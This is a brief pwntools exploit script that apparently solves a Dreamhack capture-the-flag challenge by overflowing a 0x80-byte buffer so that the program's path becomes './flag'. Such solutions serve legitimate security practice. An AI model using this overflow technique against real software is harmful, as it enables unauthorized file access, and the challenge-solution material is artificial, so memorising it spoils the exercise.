#!/usr/bin/env python3

from pwn import *

r = remote("host3.dreamhack.games", 8251)

padding = "A" * 0x80
payload = padding + "./flag"

r.sendlineafter("meow? ", payload)

r.interactive()
